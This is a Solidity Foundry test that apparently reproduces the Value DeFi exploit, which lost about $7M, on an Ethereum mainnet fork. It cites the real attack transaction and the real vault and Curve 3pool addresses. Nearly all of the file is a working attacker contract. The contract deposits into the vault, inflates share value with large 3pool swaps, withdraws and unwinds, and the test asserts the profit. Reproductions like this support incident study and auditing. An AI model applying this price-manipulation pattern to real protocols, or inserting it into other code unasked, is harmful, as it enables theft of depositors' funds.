// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost: ~$7M
// Attack TX: https://etherscan.io/tx/0x46a03488247425f845e444b9c10b52ba3c14927c687d38287c0faddc7471150a
// @Info - Curve 3pool manipulation inflated the value of newly minted vault shares.

interface IValueMultiVault {
    function deposit(
        address pool,
        address token,
        uint256 amount,
        uint256 min,
        bool stake,
        uint8 flag
    ) external;
}

interface IValueVaultToken is IERC20 {
    function withdrawFor(
        address account,
        uint256 shares,
        address output,
        uint256 minOutput
    ) external returns (uint256);
}

interface ICurve3Pool {
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 minDy
    ) external;
    function remove_liquidity_one_coin(
        uint256 tokenAmount,
        int128 i,
        uint256 minAmount
    ) external;
}

contract ValueDeFiExploitTest is Test {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.public.blastapi.io", 11_256_672);
    }

    function testExploit() public {
        ValueDeFiAttacker attacker = new ValueDeFiAttacker();
        deal(address(DAI), address(attacker), 116_000_000 ether);
        deal(address(USDT), address(attacker), 31_000_000 * 1e6);
        uint256 daiBefore = DAI.balanceOf(address(attacker));

        attacker.attack();

        assertGt(DAI.balanceOf(address(attacker)), daiBefore, "price manipulation was not profitable");
    }
}

contract ValueDeFiAttacker {
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant THREE_CRV = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    ICurve3Pool private constant THREE_POOL = ICurve3Pool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    IValueMultiVault private constant MULTI_VAULT = IValueMultiVault(0x8764f2c305b79680CfCc3398a96aedeA9260f7ff);
    IValueVaultToken private constant MV_USD = IValueVaultToken(0x55BF8304C78Ba6fe47fd251F37d7beb485f86d26);

    function attack() external {
        DAI.approve(address(MV_USD), type(uint256).max);
        DAI.approve(address(THREE_POOL), type(uint256).max);
        USDC.approve(address(THREE_POOL), type(uint256).max);
        THREE_CRV.approve(address(THREE_POOL), type(uint256).max);
        address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(THREE_POOL), type(uint256).max));

        MULTI_VAULT.deposit(address(MV_USD), address(DAI), 25_000_000 ether, 0, false, 0);

        THREE_POOL.exchange(0, 1, 91_000_000 ether, 0);
        THREE_POOL.exchange(2, 1, 31_000_000 * 1e6, 0);

        MV_USD.withdrawFor(address(this), MV_USD.balanceOf(address(this)), address(THREE_CRV), 0);

        uint256 usdcBalance = USDC.balanceOf(address(this));
        THREE_POOL.exchange(1, 2, usdcBalance / 6, 0);
        THREE_POOL.exchange(1, 0, USDC.balanceOf(address(this)), 0);
        THREE_POOL.remove_liquidity_one_coin(THREE_CRV.balanceOf(address(this)), 0, 0);
    }
}
